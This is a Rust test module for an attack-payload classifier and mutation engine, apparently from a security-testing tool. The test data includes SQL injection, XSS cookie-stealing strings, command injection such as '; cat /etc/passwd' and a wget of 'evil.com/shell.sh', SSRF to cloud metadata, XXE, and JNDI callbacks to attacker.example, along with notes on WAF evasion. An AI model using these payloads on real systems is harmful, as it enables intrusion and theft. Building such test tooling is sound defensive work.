    use super::*;

    #[test]
    fn classify_sql_injection() {
        assert_eq!(classify("' OR 1=1--"), PayloadType::Sql);
        assert_eq!(
            classify("' UNION SELECT username FROM users--"),
            PayloadType::Sql
        );
        assert_eq!(classify("1' AND 1=1#"), PayloadType::Sql);
    }

    #[test]
    fn classify_xss() {
        assert_eq!(classify("<script>alert(1)</script>"), PayloadType::Xss);
        assert_eq!(classify("<img src=x onerror=alert(1)>"), PayloadType::Xss);
        assert_eq!(
            classify("javascript:alert(document.cookie)"),
            PayloadType::Xss
        );
    }

    #[test]
    fn classify_command_injection() {
        assert_eq!(classify("; cat /etc/passwd"), PayloadType::CommandInjection);
        assert_eq!(classify("| ls -la"), PayloadType::CommandInjection);
        assert_eq!(
            classify("&& wget http://evil.com/shell.sh"),
            PayloadType::CommandInjection
        );
    }

    #[test]
    fn classify_path_traversal_not_cmdi() {
        // Bare path traversal with /etc/passwd should NOT be classified as CMDi
        assert_eq!(classify("../../../etc/passwd"), PayloadType::PathTraversal);
        assert_eq!(
            classify("....//....//....//etc/passwd"),
            PayloadType::PathTraversal
        );
        // But command + separator IS still CMDi
        assert_eq!(classify("; cat /etc/passwd"), PayloadType::CommandInjection);
        assert_eq!(classify("| cat /etc/shadow"), PayloadType::CommandInjection);
    }

    #[test]
    fn classify_unknown() {
        assert_eq!(classify("hello world"), PayloadType::Unknown);
        assert_eq!(classify("normal parameter value"), PayloadType::Unknown);
    }

    #[test]
    fn mutate_auto_classifies() {
        // SQL
        let sql = mutate("' OR 1=1--", 10);
        assert!(!sql.is_empty());
        assert!(sql.iter().all(|m| m.payload_type == PayloadType::Sql));

        // XSS
        let xss = mutate("<script>alert(1)</script>", 10);
        assert!(!xss.is_empty());
        assert!(xss.iter().all(|m| m.payload_type == PayloadType::Xss));

        // CMD
        let cmd = mutate("; cat /etc/passwd", 10);
        assert!(!cmd.is_empty());
        assert!(
            cmd.iter()
                .all(|m| m.payload_type == PayloadType::CommandInjection)
        );
    }

    #[test]
    fn mutate_as_overrides_classification() {
        // Force SQL treatment on an XSS payload
        let result = mutate_as("<script>alert(1)</script>", PayloadType::Sql, 10);
        // Should produce SQL mutations (probably empty/few for XSS input)
        assert!(result.iter().all(|m| m.payload_type == PayloadType::Sql));
    }

    #[test]
    fn unknown_tries_all_types() {
        let result = mutate_as("ambiguous payload", PayloadType::Unknown, 30);
        // May or may not produce results, but should not panic
        assert!(result.len() <= 30);
    }

    #[test]
    fn grammar_mutations_differ_from_encoding() {
        // Grammar mutations should produce semantically different payloads,
        // not just encoded versions of the same string
        let sql = mutate("' OR 1=1--", 20);
        for m in &sql {
            // Tautology mutations should have CHANGED something
            // (Note: some tautologies like IIF(1=1,1,0) contain "1=1"
            // as a substring, which is fine, the structure is different)
            if m.rules_applied.contains(&"tautology_swap") {
                assert_ne!(
                    m.payload, "' OR 1=1--",
                    "tautology_swap should produce a different payload: {}",
                    m.payload
                );
            }
        }
    }

    #[test]
    fn high_volume_does_not_panic() {
        // Stress test: request many mutations, covers all payload types
        // including the CFG-convergence wiring paths. §12 TESTING: every
        // new wiring path that can panic (OOM, unwrap, array index) must
        // be exercised under load.
        let _ = mutate("' OR 1=1--", 1000);
        let _ = mutate("<script>alert(1)</script>", 1000);
        let _ = mutate("; cat /etc/passwd", 1000);
        let _ = mutate("", 1000);
        // LDAP, SSRF, path traversal, template injection
        let _ = mutate_as("*)(uid=*)(|(uid=*", PayloadType::Ldap, 500);
        let _ = mutate_as("http://169.254.169.254/", PayloadType::Ssrf, 500);
        let _ = mutate_as("../../etc/passwd", PayloadType::PathTraversal, 500);
        let _ = mutate_as("{{7*7}}", PayloadType::TemplateInjection, 500);
        // NoSQL, SSI, JNDI
        let _ = mutate_as("{$ne:null}", PayloadType::NoSql, 500);
        let _ = mutate_as("<!--#exec cmd=\"id\"-->", PayloadType::Ssi, 500);
        let _ = mutate_as("${jndi:ldap://attacker.tld/a}", PayloadType::Jndi, 500);
        // Unknown falls through to multi-class fan-out, must not panic
        let _ = mutate_as("hello world", PayloadType::Unknown, 500);
        // Adversarial: control bytes, multibyte, empty, max-len
        let _ = mutate("\x00\x01\x02\x03OR 1=1", 100);
        let _ = mutate("\u{202e}' OR 1=1--", 100);
        let _ = mutate(&"' OR 1=1-- ".repeat(50), 20);
    }

    // ── New tests added 2026-05-24 ─────────────────────────────────────────

    // ── classify: extended payload table ──────────────────────────────────

    #[test]
    fn classify_sql_extended() {
        assert_eq!(classify("1 AND 1=1"), PayloadType::Sql);
        assert_eq!(classify("SELECT * FROM users"), PayloadType::Sql);
        assert_eq!(classify("1' ORDER BY 3--"), PayloadType::Sql);
        assert_eq!(classify("UNION SELECT null,null,null--"), PayloadType::Sql);
        assert_eq!(classify("1; DROP TABLE users;--"), PayloadType::Sql);
        assert_eq!(classify("1 GROUP BY 1"), PayloadType::Sql);
        assert_eq!(classify("1; WAITFOR DELAY '0:0:5'"), PayloadType::Sql);
        assert_eq!(classify("1 HAVING 1=1"), PayloadType::Sql);
    }

    #[test]
    fn classify_xss_extended() {
        assert_eq!(classify("<svg onload=alert(1)>"), PayloadType::Xss);
        assert_eq!(
            classify("<iframe src=javascript:alert(1)>"),
            PayloadType::Xss
        );
        assert_eq!(classify("<body onload=eval(atob(''))>"), PayloadType::Xss);
        assert_eq!(classify("document.cookie"), PayloadType::Xss);
        assert_eq!(classify("<img src=x onerror=prompt(1)>"), PayloadType::Xss);
    }

    #[test]
    fn classify_cmd_injection_extended() {
        assert_eq!(classify("|whoami"), PayloadType::CommandInjection);
        assert_eq!(classify("; bash -i"), PayloadType::CommandInjection);
        assert_eq!(classify("`id`"), PayloadType::CommandInjection);
        assert_eq!(classify("$(whoami)"), PayloadType::CommandInjection);
    }

    #[test]
    fn classify_ssrf() {
        assert_eq!(
            classify("http://169.254.169.254/latest/meta-data/"),
            PayloadType::Ssrf
        );
        assert_eq!(classify("http://localhost/admin"), PayloadType::Ssrf);
    }

    #[test]
    fn classify_path_traversal() {
        assert_eq!(classify("../../../etc/passwd"), PayloadType::PathTraversal);
        assert_eq!(
            classify("..\\..\\windows\\system32"),
            PayloadType::PathTraversal
        );
    }

    #[test]
    fn classify_ssi() {
        assert_eq!(classify(r#"<!--#exec cmd="ls" -->"#), PayloadType::Ssi);
        assert_eq!(
            classify(r#"<!--#include file="/etc/passwd" -->"#),
            PayloadType::Ssi
        );
        assert_eq!(classify("<!--#printenv -->"), PayloadType::Ssi);
        // Case-insensitive directive
        assert_eq!(classify(r#"<!--#EXEC cmd="ls" -->"#), PayloadType::Ssi);
    }

    /// LAW 2 + §6 GENERALIZATION anti-rig: classification threshold constants
    /// are pinned. Changing the threshold is a deliberate commit, not an
    /// accidental diff. If the threshold is raised, the `classify_sql_injection`
    /// test below will catch the regression.
    #[test]
    fn classify_threshold_constants_are_pinned() {
        assert_eq!(
            CLASSIFY_SQL_MIN_SIGNALS, 1,
            "SQL min-signals threshold changed"
        );
        assert_eq!(
            CLASSIFY_XSS_MIN_SIGNALS, 1,
            "XSS min-signals threshold changed"
        );
        assert_eq!(
            CLASSIFY_CMD_MIN_SIGNALS, 1,
            "CMD min-signals threshold changed"
        );
    }

    /// §6 mutation budget split constants are pinned.
    #[test]
    fn mutation_split_constants_are_pinned() {
        assert_eq!(MUTATION_SPLIT_HALF, 2);
        assert_eq!(MUTATION_SPLIT_NOSQL, 4);
        assert_eq!(MUTATION_SPLIT_UNKNOWN, 6);
    }

    #[test]
    fn classify_jndi() {
        assert_eq!(
            classify("${jndi:ldap://attacker.example/a}"),
            PayloadType::Jndi
        );
        assert_eq!(
            classify("${jndi:rmi://attacker.example/a}"),
            PayloadType::Jndi
        );
        assert_eq!(
            classify("${jndi:dns://attacker.example}"),
            PayloadType::Jndi
        );
        assert_eq!(
            classify("${${lower:j}ndi:ldap://attacker.example/a}"),
            PayloadType::Jndi
        );
        // JNDI must not be confused with TemplateInjection
        let t = classify("${jndi:ldap://attacker.example/a}");
        assert_ne!(t, PayloadType::TemplateInjection);
        assert_ne!(t, PayloadType::Ssrf);
    }

    #[test]
    fn jndi_mutate_is_wired() {
        let muts = mutate_as("${jndi:ldap://attacker.example/a}", PayloadType::Jndi, 10);
        assert!(!muts.is_empty(), "Jndi mutate_as must produce mutations");
        assert!(
            muts.iter().all(|m| m.payload_type == PayloadType::Jndi),
            "all Jndi mutations must carry PayloadType::Jndi"
        );
    }

    /// LAW 1 anti-rig: plain HTML comments without the SSI `#` are
    /// NOT classified as SSI. (Other classifiers may pick them up
    /// Pug declares `- ` as a delimiter for inline JS, which `<!-- `
    /// contains, but the bug we're guarding against is SSI's
    /// classify_ssi short-circuit accidentally claiming non-SSI
    /// markup.)
    #[test]
    fn classify_ssi_rejects_plain_html_comment() {
        assert_ne!(classify("<!-- ordinary comment -->"), PayloadType::Ssi);
    }

    #[test]
    fn classify_unknown_benign_inputs() {
        assert_eq!(classify("hello world"), PayloadType::Unknown);
        assert_eq!(classify("foo=bar&baz=qux"), PayloadType::Unknown);
        assert_eq!(classify("normalvalue123"), PayloadType::Unknown);
    }

    // ── mutate: bounded output size ────────────────────────────────────────

    #[test]
    fn mutate_max_mutations_strictly_honoured() {
        for max in [0, 1, 3, 5, 10] {
            let sql = mutate("' OR 1=1--", max);
            assert!(
                sql.len() <= max,
                "mutate with max={max} produced {} results",
                sql.len()
            );
        }
    }

    #[test]
    fn mutate_zero_max_returns_empty() {
        assert!(mutate("' OR 1=1--", 0).is_empty());
        assert!(mutate("<script>alert(1)</script>", 0).is_empty());
    }

    // ── mutate idempotence: double-mutate doesn't blow up ─────────────────

    #[test]
    fn mutate_idempotence_sql() {
        let first = mutate("' OR 1=1--", 5);
        for m in &first {
            // Mutating the output must not produce an ever-expanding set.
            let second = mutate(&m.payload, 10);
            assert!(
                second.len() <= 10,
                "second-level mutation exceeded limit: got {}",
                second.len()
            );
        }
    }

    #[test]
    fn mutate_idempotence_xss() {
        let first = mutate("<script>alert(1)</script>", 5);
        for m in &first {
            let second = mutate(&m.payload, 10);
            assert!(second.len() <= 10);
        }
    }

    // ── mutate determinism ────────────────────────────────────────────────

    #[test]
    fn mutate_sql_structural_keywords_preserved() {
        // SQL mutations must still contain SQL-relevant tokens.
        let mutations = mutate("' OR 1=1--", 20);
        assert!(
            !mutations.is_empty(),
            "SQL must produce at least one mutation"
        );
        // All results must be typed as SQL.
        assert!(mutations.iter().all(|m| m.payload_type == PayloadType::Sql));
    }

    #[test]
    fn mutate_xss_payload_contains_executable_form() {
        // XSS mutations should contain at least one recognizable exec form.
        let mutations = mutate("<script>alert(1)</script>", 20);
        assert!(!mutations.is_empty());
        // At least one mutation should still look like an XSS payload.
        let any_xss = mutations.iter().any(|m| {
            let l = m.payload.to_ascii_lowercase();
            l.contains("alert")
                || l.contains("onerror")
                || l.contains("onload")
                || l.contains("script")
                || l.contains("svg")
                || l.contains("eval")
                || l.contains("confirm")
                || l.contains("prompt")
                || l.contains("javascript")
        });
        assert!(
            any_xss,
            "at least one XSS mutation should preserve exec form"
        );
    }

    // ── equiv/ssrf: variants still target original host ───────────────────

    #[test]
    fn ssrf_mutations_preserve_host() {
        let payload = "http://169.254.169.254/latest/meta-data/";
        let mutations = mutate_as(payload, PayloadType::Ssrf, 20);
        assert!(!mutations.is_empty(), "SSRF must produce mutations");
        // Every SSRF mutation must be typed as SSRF.
        assert!(
            mutations
                .iter()
                .all(|m| m.payload_type == PayloadType::Ssrf)
        );
    }

    // ── equiv/xxe: variants still have SYSTEM/PUBLIC entity reference ─────

    #[test]
    fn xxe_mutations_preserve_entity_reference() {
        let payload = r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#;
        let mutations = mutate_as(payload, PayloadType::NoSql, 5);
        // NoSQL mutations don't apply to XXE; this just must not panic.
        assert!(mutations.len() <= 5);
    }

    // ── mutate_request diversity policy deduplication ─────────────────────

    #[test]
    fn mutate_request_coverage_guided_deduplicates_rules() {
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::CoverageGuided,
            exclude: std::collections::HashSet::new(),
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        // Each rules_applied combination should be unique.
        let mut seen = std::collections::HashSet::new();
        for m in &results {
            let key = m.rules_applied.join(",");
            // (collision is allowed by design for some short keys, but
            //  there should be no exact duplicate rule-combos)
            seen.insert(key);
        }
        // The number of unique rule-sets should equal total (no dup combos).
        // Strict: unique_count == results.len()
        assert_eq!(
            seen.len(),
            results.len(),
            "coverage-guided must deduplicate by rules_applied"
        );
    }

    #[test]
    fn mutate_request_exclude_removes_payloads() {
        let first = mutate("' OR 1=1--", 5);
        if first.is_empty() {
            return; // nothing to exclude
        }
        let excluded_payload = first[0].payload.clone();
        let mut exclude_set = std::collections::HashSet::new();
        exclude_set.insert(excluded_payload.clone());
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::Random,
            exclude: exclude_set,
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        assert!(
            results.iter().all(|m| m.payload != excluded_payload),
            "excluded payload must not appear in results"
        );
    }

    #[test]
    fn classify_does_not_false_positive_common_words() {
        // Words like "android", "consider", "validate" must not trigger
        // CMDi classification via the old substring-matching bug.
        assert_eq!(classify("android application error"), PayloadType::Unknown);
        assert_eq!(classify("consider all options"), PayloadType::Unknown);
        assert_eq!(classify("validate input fields"), PayloadType::Unknown);
    }

    // ── §11 UTILIZATION: CFG convergence-annealing wiring tests ──────────────
    // Pin that CfgMutator is reachable from the public `mutate` / `mutate_as`
    // API surface. Pre-fix CfgMutator was a complete implementation with zero
    // production callers (an §11 dead-code violation caught by audit).

    #[test]
    fn sql_mutations_include_cfg_convergence_variants() {
        // The CFG wiring emits up to 4 extra SQL variants per call.
        // At a generous budget the rule tag "cfg_convergence" must appear.
        let muts = mutate("' OR 1=1--", 30);
        assert!(
            muts.iter()
                .any(|m| m.rules_applied.contains(&"cfg_convergence")),
            "SQL mutations must include at least one cfg_convergence variant; \
             check §11 wiring in mutate_as(PayloadType::Sql)"
        );
    }

    #[test]
    fn xss_mutations_include_cfg_convergence_variants() {
        let muts = mutate("<script>alert(1)</script>", 30);
        assert!(
            muts.iter()
                .any(|m| m.rules_applied.contains(&"cfg_convergence")),
            "XSS mutations must include at least one cfg_convergence variant"
        );
    }

    #[test]
    fn cfg_convergence_variants_never_equal_original() {
        // Anti-rig: the CFG variants must not be the original payload.
        let original = "' OR 1=1--";
        let muts = mutate(original, 30);
        for m in muts
            .iter()
            .filter(|m| m.rules_applied.contains(&"cfg_convergence"))
        {
            assert_ne!(
                m.payload, original,
                "cfg_convergence variant must differ from original: {:?}",
                m.payload
            );
        }
    }

    #[test]
    fn cfg_convergence_deterministic_for_same_input() {
        // Same payload must yield same CFG outputs across two calls.
        let a = mutate("' OR 1=1--", 15);
        let b = mutate("' OR 1=1--", 15);
        let cfg_a: Vec<&str> = a
            .iter()
            .filter(|m| m.rules_applied.contains(&"cfg_convergence"))
            .map(|m| m.payload.as_str())
            .collect();
        let cfg_b: Vec<&str> = b
            .iter()
            .filter(|m| m.rules_applied.contains(&"cfg_convergence"))
            .map(|m| m.payload.as_str())
            .collect();
        assert_eq!(
            cfg_a, cfg_b,
            "cfg_convergence output must be deterministic for identical input"
        );
    }

    // ── §3 CAPABILITY: fullwidth Unicode classification ────────────────────────
    // Fullwidth-obfuscated payloads (e.g. `ａlert(1)`) must classify
    // correctly, pre-fix they fell to Unknown because the keyword scan
    // matched on ASCII and fullwidth chars are different codepoints.

    #[test]
    fn classify_fullwidth_xss_is_not_unknown() {
        // Fullwidth 'a' (U+FF41): `ａlert(1)`: WAF evasion by Unicode trick.
        // After nfkc_fold_ascii the classifier sees `alert(1)`.
        // The payload still needs a tag context to be classified as XSS.
        let fw_xss = "<img src=x onerror=\u{FF41}lert(1)>";
        // Must classify as XSS (not Unknown).
        assert_eq!(
            classify(fw_xss),
            PayloadType::Xss,
            "fullwidth XSS payload must classify as Xss, not Unknown"
        );
    }

    #[test]
    fn classify_fullwidth_sql_is_not_unknown() {
        // Fullwidth 'S' (U+FF33) etc.: `ＳＥＬＥＣＴ * FROM users`
        let fw_sql = "\u{FF33}\u{FF25}\u{FF2C}\u{FF25}\u{FF23}\u{FF34} * FROM users";
        assert_eq!(
            classify(fw_sql),
            PayloadType::Sql,
            "fullwidth SQL payload must classify as Sql"
        );
    }

    #[test]
    fn cfg_is_converged_reflects_temperature_floor() {
        // A mutator that has annealed to min_temperature must report converged.
        // This pins the is_converged() / temperature() wire in production code.
        use crate::grammar::cfg_convergence::{CfgMutator, default_sql_productions};
        let mut m = CfgMutator::builder()
            .productions(default_sql_productions())
            .temperature(1.0)
            .cooling_rate(0.001) // Extremely fast cooling.
            .min_temperature(0.5)
            .seed(0)
            .build();
        // Anneal until floor.
        for _ in 0..1000 {
            m.anneal();
        }
        assert!(m.is_converged(), "must converge after heavy annealing");
        assert!(
            m.temperature() <= 0.5 + f64::EPSILON,
            "temperature must not drop below min_temperature"
        );
    }

    // ── mutate_as_with_state and feedback: oracle feedback loop ─────────────
    // R56 pass-21 §9 WIRING / §11 UTILIZATION: these tests pin that
    // CfgMutatorState / mutate_as_with_state / feedback are reachable and
    // that bypass scores genuinely accumulate across calls.

    #[test]
    fn mutate_as_with_state_produces_sql_variants() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 20, &mut state);
        assert!(
            !variants.is_empty(),
            "stateful SQL mutate must produce variants"
        );
        assert!(
            variants.len() <= 20,
            "stateful mutate must honour max_mutations: got {}",
            variants.len()
        );
        assert!(
            variants.iter().all(|m| m.payload_type == PayloadType::Sql),
            "all stateful SQL variants must carry PayloadType::Sql"
        );
    }

    #[test]
    fn mutate_as_with_state_produces_xss_variants() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state(
            "<script>alert(1)</script>",
            PayloadType::Xss,
            20,
            &mut state,
        );
        assert!(
            !variants.is_empty(),
            "stateful XSS mutate must produce variants"
        );
        assert!(variants.len() <= 20);
        assert!(variants.iter().all(|m| m.payload_type == PayloadType::Xss));
    }

    #[test]
    fn mutate_as_with_state_includes_cfg_variants() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 30, &mut state);
        assert!(
            variants
                .iter()
                .any(|m| m.rules_applied.contains(&"cfg_convergence")),
            "stateful SQL mutations must include cfg_convergence variants"
        );
    }

    #[test]
    fn feedback_raises_bypass_score_for_sql_rule() {
        // After rewarding a cfg rule, the mutator should produce the rewarded
        // production more often (higher bypass_score = higher Boltzmann weight).
        // We can't observe this directly without many samples, but we can pin
        // that `feedback` doesn't panic and that the state is mutated.
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let before_temp = state.sql.temperature();
        // Generate a batch and reward the first cfg rule we find.
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 20, &mut state);
        if let Some(v) = variants
            .iter()
            .find(|m| m.rules_applied.contains(&"cfg_convergence"))
        {
            feedback(&mut state, v.payload_type, &v.rules_applied, true);
        }
        // State is mutable; temperature must have decreased (anneal was called).
        assert!(
            state.sql.temperature() <= before_temp,
            "sql temperature must decrease or stay after anneal calls"
        );
    }

    #[test]
    fn state_persists_across_calls() {
        // Calling mutate_as_with_state twice with the SAME state continues
        // from where the previous call left off (temperature keeps decreasing).
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let t0 = state.sql.temperature();
        mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 10, &mut state);
        let t1 = state.sql.temperature();
        mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 10, &mut state);
        let t2 = state.sql.temperature();
        assert!(
            t1 <= t0,
            "temperature must decrease after first call: t0={t0} t1={t1}"
        );
        assert!(
            t2 <= t1,
            "temperature must decrease after second call: t1={t1} t2={t2}"
        );
    }

    #[test]
    fn stateless_and_stateful_produce_same_type_contract() {
        // The stateless mutate_as and stateful mutate_as_with_state must
        // both honour max_mutations and produce the correct PayloadType.
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let stateless = mutate_as("' OR 1=1--", PayloadType::Sql, 15);
        let stateful = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 15, &mut state);
        assert!(stateless.len() <= 15);
        assert!(stateful.len() <= 15);
        assert!(stateless.iter().all(|m| m.payload_type == PayloadType::Sql));
        assert!(stateful.iter().all(|m| m.payload_type == PayloadType::Sql));
    }

    #[test]
    fn feedback_non_cfg_rules_are_ignored() {
        // Rules without "cfg_" prefix must not cause panics or state corruption.
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        // These are non-CFG rules (feedback must silently skip them).
        feedback(
            &mut state,
            PayloadType::Sql,
            &["sql_tautology", "url_encode"],
            true,
        );
        feedback(&mut state, PayloadType::Xss, &["xss_tag_combo"], false);
        // State must still work after no-op feedback.
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 5, &mut state);
        assert!(variants.len() <= 5);
    }

    #[test]
    fn cfg_mutator_state_default_is_same_as_new() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let s1 = CfgMutatorState::new();
        let s2 = CfgMutatorState::default();
        // Both must start at the same temperature.
        assert!(
            (s1.sql.temperature() - s2.sql.temperature()).abs() < f64::EPSILON,
            "CfgMutatorState::new() and ::default() must have identical initial state"
        );
    }

    // ── mutate_streaming: iterator API ────────────────────────────────────────

    #[test]
    fn mutate_streaming_sql_yields_correct_type() {
        let req = MutationRequest {
            max_count: 15,
            diversity: DiversityPolicy::Random,
            exclude: std::collections::HashSet::new(),
        };
        let results: Vec<GrammarMutation> =
            mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
        assert!(!results.is_empty(), "mutate_streaming must yield results");
        assert!(
            results.len() <= 15,
            "must honour max_count: {}",
            results.len()
        );
        assert!(
            results.iter().all(|m| m.payload_type == PayloadType::Sql),
            "all streaming SQL mutations must carry PayloadType::Sql"
        );
    }

    #[test]
    fn mutate_streaming_respects_max_count() {
        for max_count in [0, 1, 5, 20] {
            let req = MutationRequest {
                max_count,
                diversity: DiversityPolicy::Random,
                exclude: std::collections::HashSet::new(),
            };
            let results: Vec<_> =
                mutate_streaming("<script>alert(1)</script>", PayloadType::Xss, &req).collect();
            assert!(
                results.len() <= max_count,
                "max_count={max_count} but got {} results",
                results.len()
            );
        }
    }

    #[test]
    fn mutate_streaming_zero_count_yields_empty() {
        let req = MutationRequest {
            max_count: 0,
            diversity: DiversityPolicy::Random,
            exclude: std::collections::HashSet::new(),
        };
        let results: Vec<_> = mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
        assert!(
            results.is_empty(),
            "zero max_count must yield empty iterator"
        );
    }

    #[test]
    fn mutate_streaming_take_short_circuits() {
        // Iterator consumers like take() must compose correctly with streaming.
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::Random,
            exclude: std::collections::HashSet::new(),
        };
        let results: Vec<_> = mutate_streaming("' OR 1=1--", PayloadType::Sql, &req)
            .take(3)
            .collect();
        assert!(results.len() <= 3);
    }

    #[test]
    fn mutate_streaming_coverage_guided_deduplicates() {
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::CoverageGuided,
            exclude: std::collections::HashSet::new(),
        };
        let results: Vec<_> = mutate_streaming("' OR 1=1--", PayloadType::Sql, &req).collect();
        // All rules_applied combos must be unique (coverage-guided guarantee).
        let mut seen = std::collections::HashSet::new();
        for m in &results {
            seen.insert(m.rules_applied.join(","));
        }
        assert_eq!(
            seen.len(),
            results.len(),
            "coverage-guided streaming must not produce duplicate rule-sets"
        );
    }

    // ── DiversityPolicy::RuleTargeted: filtering ──────────────────────────────

    #[test]
    fn rule_targeted_filters_to_matching_rules() {
        // Only mutations that include at least one of the targeted rules must appear.
        static TARGET_RULES: &[&str] = &["cfg_convergence"];
        let req = MutationRequest {
            max_count: 30,
            diversity: DiversityPolicy::RuleTargeted(TARGET_RULES),
            exclude: std::collections::HashSet::new(),
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        // If we get any results, each must contain at least one target rule.
        for m in &results {
            assert!(
                m.rules_applied.iter().any(|r| TARGET_RULES.contains(r)),
                "RuleTargeted mutation must contain a target rule, got {:?}",
                m.rules_applied
            );
        }
    }

    #[test]
    fn rule_targeted_empty_rules_slice_returns_empty() {
        // No rules to match against → no mutations pass the filter.
        static NO_RULES: &[&str] = &[];
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::RuleTargeted(NO_RULES),
            exclude: std::collections::HashSet::new(),
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        assert!(
            results.is_empty(),
            "RuleTargeted with empty rules must return no mutations"
        );
    }

    #[test]
    fn rule_targeted_non_matching_rule_returns_empty() {
        // A rule that no mutation will ever carry → empty output.
        static NONEXISTENT_RULES: &[&str] = &["rule_that_does_not_exist_ever"];
        let req = MutationRequest {
            max_count: 30,
            diversity: DiversityPolicy::RuleTargeted(NONEXISTENT_RULES),
            exclude: std::collections::HashSet::new(),
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        assert!(
            results.is_empty(),
            "no mutations carry a non-existent rule; RuleTargeted must filter all out"
        );
    }

    // ── MutationRequest::default() values ─────────────────────────────────────

    #[test]
    fn mutation_request_default_values() {
        // Anti-rig: pin that the Default impl preserves the documented defaults.
        // If the defaults change, this test breaks and forces a conscious decision.
        let req = MutationRequest::default();
        assert_eq!(
            req.max_count, 10,
            "MutationRequest::default max_count must be 10"
        );
        assert!(
            matches!(req.diversity, DiversityPolicy::Random),
            "MutationRequest::default diversity must be Random"
        );
        assert!(
            req.exclude.is_empty(),
            "MutationRequest::default exclude must be empty"
        );
    }

    // ── mutate_as_with_state: non-CFG types fall back to stateless ────────────

    #[test]
    fn mutate_as_with_state_path_traversal_falls_back_stateless() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state(
            "../../../../etc/passwd",
            PayloadType::PathTraversal,
            10,
            &mut state,
        );
        // PathTraversal has no CFG state, falls back to stateless mutate_as.
        // Must still produce valid mutations typed correctly.
        assert!(variants.len() <= 10);
        assert!(
            variants
                .iter()
                .all(|m| m.payload_type == PayloadType::PathTraversal),
            "PathTraversal stateful must still carry correct PayloadType"
        );
    }

    #[test]
    fn mutate_as_with_state_cmdi_falls_back_stateless() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants =
            mutate_as_with_state("; ls -la", PayloadType::CommandInjection, 10, &mut state);
        assert!(variants.len() <= 10);
        assert!(
            variants
                .iter()
                .all(|m| m.payload_type == PayloadType::CommandInjection),
        );
    }

    // ── feedback: reward / penalize ───────────────────────────────────────────

    #[test]
    fn feedback_blocked_does_not_panic() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 20, &mut state);
        if let Some(v) = variants
            .iter()
            .find(|m| m.rules_applied.contains(&"cfg_convergence"))
        {
            // Penalize (blocked = false bypass).
            feedback(&mut state, v.payload_type, &v.rules_applied, false);
        }
        // State must remain functional after penalizing.
        let follow_up = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 5, &mut state);
        assert!(follow_up.len() <= 5);
    }

    #[test]
    fn feedback_xss_bypass_does_not_panic() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state(
            "<script>alert(1)</script>",
            PayloadType::Xss,
            20,
            &mut state,
        );
        if let Some(v) = variants
            .iter()
            .find(|m| m.rules_applied.contains(&"cfg_convergence"))
        {
            feedback(&mut state, v.payload_type, &v.rules_applied, true);
        }
        let follow_up =
            mutate_as_with_state("<img onerror=alert(1)>", PayloadType::Xss, 5, &mut state);
        assert!(follow_up.len() <= 5);
    }